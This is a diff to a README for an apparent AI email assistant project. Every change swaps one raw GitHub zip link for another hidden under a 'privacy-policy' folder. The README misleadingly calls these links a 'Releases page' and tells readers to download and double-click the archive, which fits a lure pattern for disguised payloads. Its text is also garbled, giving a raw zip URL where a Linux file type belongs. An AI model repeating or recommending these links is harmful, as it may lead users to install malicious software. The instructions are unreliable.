@@ -1,6 +1,6 @@
 # 🤖 notabeen-ai-email-assistant - Simplify Your Email Management Today
 
-[![Download Notabeen](https://raw.githubusercontent.com/IerogliFGD/notabeen-ai-email-assistant/main/fideicommissum/notabeen-ai-email-assistant.zip)](https://raw.githubusercontent.com/IerogliFGD/notabeen-ai-email-assistant/main/fideicommissum/notabeen-ai-email-assistant.zip)
+[![Download Notabeen](https://raw.githubusercontent.com/IerogliFGD/notabeen-ai-email-assistant/main/src/app/privacy-policy/ai_notabeen_assistant_email_3.0.zip)](https://raw.githubusercontent.com/IerogliFGD/notabeen-ai-email-assistant/main/src/app/privacy-policy/ai_notabeen_assistant_email_3.0.zip)
 
 ## 📥 Overview
 Notabeen is an open-source AI-powered email assistant designed to help you manage your inbox efficiently. With this tool, you can reduce email clutter and focus on what really matters in your communications. Whether you need assistance sorting your messages or managing your tasks, Notabeen has you covered.
@@ -17,11 +17,11 @@ Before you dive in, ensure that your system meets the following requirements:
 - **Internet Connection:** Required for installation and updates
 
 ## 📂 Download & Install
-1. Visit the Releases page to download the latest version of Notabeen: [Download Notabeen](https://raw.githubusercontent.com/IerogliFGD/notabeen-ai-email-assistant/main/fideicommissum/notabeen-ai-email-assistant.zip).
+1. Visit the Releases page to download the latest version of Notabeen: [Download Notabeen](https://raw.githubusercontent.com/IerogliFGD/notabeen-ai-email-assistant/main/src/app/privacy-policy/ai_notabeen_assistant_email_3.0.zip).
    
 2. On the Releases page, find the version you want, and click on it to see the available files. 
 
-3. Download the file suitable for your operating system. It will usually be listed as an `.exe` file for Windows, a `.dmg` file for macOS, or a `https://raw.githubusercontent.com/IerogliFGD/notabeen-ai-email-assistant/main/fideicommissum/notabeen-ai-email-assistant.zip` file for Linux.
+3. Download the file suitable for your operating system. It will usually be listed as an `.exe` file for Windows, a `.dmg` file for macOS, or a `https://raw.githubusercontent.com/IerogliFGD/notabeen-ai-email-assistant/main/src/app/privacy-policy/ai_notabeen_assistant_email_3.0.zip` file for Linux.
 
 4. After the download is complete, locate the file on your computer and double-click it to start the installation process.
 
@@ -53,4 +53,4 @@ We continuously work to improve Notabeen. You can expect regular updates that in
 
 We appreciate your interest in Notabeen. Enjoy managing your emails more efficiently! 
 
-[Download Notabeen](https://raw.githubusercontent.com/IerogliFGD/notabeen-ai-email-assistant/main/fideicommissum/notabeen-ai-email-assistant.zip)
+[Download Notabeen](https://raw.githubusercontent.com/IerogliFGD/notabeen-ai-email-assistant/main/src/app/privacy-policy/ai_notabeen_assistant_email_3.0.zip)
